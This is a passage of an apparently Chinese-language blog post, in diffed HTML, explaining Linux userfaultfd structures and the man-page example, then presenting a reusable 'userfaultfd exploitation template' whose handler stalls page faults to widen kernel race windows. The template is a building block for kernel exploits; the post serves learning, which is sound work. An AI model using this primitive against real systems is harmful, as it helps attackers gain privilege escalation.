UFFD_FEATURE_SIGBUS			(1&lt;&lt;7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_THREAD_ID			(1&lt;&lt;8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_MINOR_HUGETLBFS		(1&lt;&lt;9)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_FEATURE_MINOR_SHMEM		(1&lt;&lt;10)</span><br>	__u64 features;<br>	__u64 ioctls;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>uffdio_register </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_range</span> <span class="hljs-title">range</span>;</span><br>	<span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_MISSING	((__u64)1&lt;&lt;0)</span><br>	<span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_WP		((__u64)1&lt;&lt;1)</span><br>	<span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_MINOR	((__u64)1&lt;&lt;2)</span><br>	__u64 mode;<br>	__u64 ioctls;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>uffdio_range </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_range</span> &#123;</span><br>	__u64 start;<br>	__u64 len;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>注册uffd，默认的变量赋值，抄linxu man page🤣（不是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br><span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>   err(EXIT_FAILURE, <span class="hljs-string">&quot;userfaultfd&quot;</span>);<br>uffdio_api.api = UFFD_API;<br>uffdio_api.features = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>   err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>   err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这里是申请一块地址，也就是<code>uffd monitor</code> 监视的地址</p>
+<p>结合上面的结构体，这里地址的起始地址被赋值给了<code>uffdio_register.range.start</code> ，然后长度是<code>uffdio_register.range.len = len</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">addr = mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE,<br>             MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>   err(EXIT_FAILURE, <span class="hljs-string">&quot;mmap&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address returned by mmap() = %p\n&quot;</span>, addr);<br><br><span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">  handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">  missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>uffdio_register.range.len = len;<br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>   err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>创建监视的线程，也就是具体的操作在这个函数<code>fault_handler_thread</code> 实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br><span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>    errc(EXIT_FAILURE, s, <span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="fault-handler-thread"><a href="#fault-handler-thread" class="headerlink" title="fault_handler_thread"></a>fault_handler_thread</h3><p>涉及的变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>                 nready;<br><span class="hljs-type">long</span>                uffd;   <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><span class="hljs-type">ssize_t</span>             nread;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span>       <span class="hljs-title">pollfd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span>  <span class="hljs-title">uffdio_copy</span>;</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span>      fault_cnt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* Number of faults so far handled */</span><br><span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span>  <span class="hljs-title">msg</span>;</span>  <span class="hljs-comment">/* Data read from userfaultfd */</span><br></code></pre></td></tr></table></figure>
+
+<p>涉及的结构体</p>
+<p>pollfd</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">int</span> fd;			<span class="hljs-comment">/* File descriptor to poll.  */</span><br>    <span class="hljs-type">short</span> <span class="hljs-type">int</span> events;		<span class="hljs-comment">/* Types of events poller cares about.  */</span><br>    <span class="hljs-type">short</span> <span class="hljs-type">int</span> revents;		<span class="hljs-comment">/* Types of events that actually occurred.  */</span><br>  &#125;;<br></code></pre></td></tr></table></figure>
+
+<p>uffdio_copy</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> &#123;</span><br>	__u64 dst;<br>	__u64 src;<br>	__u64 len;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_COPY_MODE_DONTWAKE		((__u64)1&lt;&lt;0)</span><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * UFFDIO_COPY_MODE_WP will map the page write protected on</span><br><span class="hljs-comment">	 * the fly.  UFFDIO_COPY_MODE_WP is available only if the</span><br><span class="hljs-comment">	 * write protected ioctl is implemented for the range</span><br><span class="hljs-comment">	 * according to the uffdio_register.ioctls.</span><br><span class="hljs-comment">	 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_COPY_MODE_WP			((__u64)1&lt;&lt;1)</span><br>	__u64 mode;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * &quot;copy&quot; is written by the ioctl and must be at the end: the</span><br><span class="hljs-comment">	 * copy_from_user will not read the last 8 bytes.</span><br><span class="hljs-comment">	 */</span><br>	__s64 copy;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>uffd_msg </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> &#123;</span><br>	__u8	event;<br><br>	__u8	reserved1;<br>	__u16	reserved2;<br>	__u32	reserved3;<br><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			__u64	flags;<br>			__u64	address;<br>			<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>				__u32 ptid;<br>			&#125; feat;<br>		&#125; pagefault;<br><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			__u32	ufd;<br>		&#125; fork;<br><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			__u64	from;<br>			__u64	to;<br>			__u64	len;<br>		&#125; remap;<br><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			__u64	start;<br>			__u64	end;<br>		&#125; remove;<br><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			<span class="hljs-comment">/* unused reserved fields */</span><br>			__u64	reserved1;<br>			__u64	reserved2;<br>			__u64	reserved3;<br>		&#125; reserved;<br>	&#125; arg;<br>&#125; __attribute__((packed));<br></code></pre></td></tr></table></figure>
+
+<p><code>handler()</code> 将 <code>msg</code>发送给<code>uffd monitor</code>，<code>uffd msg</code> 也就是的msg的结构体类型</p>
+<p>可以观察到有五种类型，分别是<code>pagefault</code>  <code>fork</code>  <code>remap</code>  <code>remove</code>  <code>reversed</code> </p>
+<p>目前使用到的类型也就是<code>pagefault</code> </p>
+<p>这里主要就是一个for循环，不断的轮询，直至发生缺页异常</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>   <span class="hljs-type">int</span>                 nready;<br>   <span class="hljs-type">long</span>                uffd;   <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>   <span class="hljs-type">ssize_t</span>             nread;<br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span>       <span class="hljs-title">pollfd</span>;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span>  <span class="hljs-title">uffdio_copy</span>;</span><br><br>   <span class="hljs-type">static</span> <span class="hljs-type">int</span>      fault_cnt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* Number of faults so far handled */</span><br>   <span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br>   <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span>  <span class="hljs-title">msg</span>;</span>  <span class="hljs-comment">/* Data read from userfaultfd */</span><br><br>   uffd = (<span class="hljs-type">long</span>) arg;<br><br>   <span class="hljs-comment">/* Create a page that will be copied into the faulting region. */</span><br><br>   <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) &#123;<br>       page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                   MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>       <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;mmap&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">      file descriptor. */</span><br><br>   <span class="hljs-keyword">for</span> (;;) &#123;<br><br>       <span class="hljs-comment">/* See what poll() tells us about the userfaultfd. */</span><br><br>       pollfd.fd = uffd;<br>       pollfd.events = POLLIN;<br>       nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>       <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;poll&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>              <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>              (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>              (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>       <span class="hljs-comment">/* Read an event from the userfaultfd. */</span><br><br>       nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;read&quot;</span>);<br><br>       <span class="hljs-comment">/* We expect only one kind of event; verify that assumption. */</span><br><br>       <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>           <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>           <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>       &#125;<br><br>       <span class="hljs-comment">/* Display info about the page-fault event. */</span><br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %&quot;</span>PRIx64<span class="hljs-string">&quot;; &quot;</span>, msg.arg.pagefault.flags);<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %&quot;</span>PRIx64<span class="hljs-string">&quot;\n&quot;</span>, msg.arg.pagefault.address);<br><br>       <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">          region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">          is more obvious that each fault is handled separately. */</span><br><br>       <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>       fault_cnt++;<br><br>       uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br><br>       <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">          So, round faulting address down to page boundary. */</span><br><br>       uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                          ~(page_size - <span class="hljs-number">1</span>);<br>       uffdio_copy.len = page_size;<br>       uffdio_copy.mode = <span class="hljs-number">0</span>;<br>       uffdio_copy.copy = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>           err(EXIT_FAILURE, <span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %&quot;</span>PRId64<span class="hljs-string">&quot;)\n&quot;</span>,<br>              uffdio_copy.copy);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个计算页起始地址的表达式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
+
+<p>例如当前的地址为0x12345678，通过计算后即为0x12345000</p>
+<h2 id="userfaultfd利用模板"><a href="#userfaultfd利用模板" class="headerlink" title="userfaultfd利用模板"></a>userfaultfd利用模板</h2><h3 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍"></a>模板介绍</h3><p>最外层的调用函数<code>Userfaultfd_Exploit</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Userfaultfd_Exploit</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *monitor_thread, <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length)</span>&#123;<br>    Register_Userfaultfd(monitor_thread, buf, length, fault_handler_thread);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>下一层调用为<code>Register_Userfaultfd</code> ，显而易见是注册uffd</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Register_Userfaultfd</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *monitor_thread, <span class="hljs-type">void</span> *addr, </span><br><span class="hljs-params">                            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> *(*handler)(<span class="hljs-type">void</span>*))</span>&#123;<br>    <span class="hljs-type">long</span> uffd;    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    <span class="hljs-type">int</span> s = pthread_create(monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>因为利用的时候需要一个可控的地址，所以移除了原本改函数里的mmap操作</p>
+<p>下面是线程函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        在此操作        </span><br><span class="hljs-comment">        */</span><br>        sleep(<span class="hljs-number">10000000</span>);<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) temp_page_for_UffdThread_stuck;<br>        <span class="hljs-comment">//赋值为page的起始地址</span><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(<span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在nread之后进行sleep，可以实现阻塞这个线程的效果，也就是达到了条件竞争的假象</p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>首先申请一块内存区域，用于被<code>uffd monitor</code>监视，然后直接调用<code>Userfaultfd_Exploit</code>即可</p>
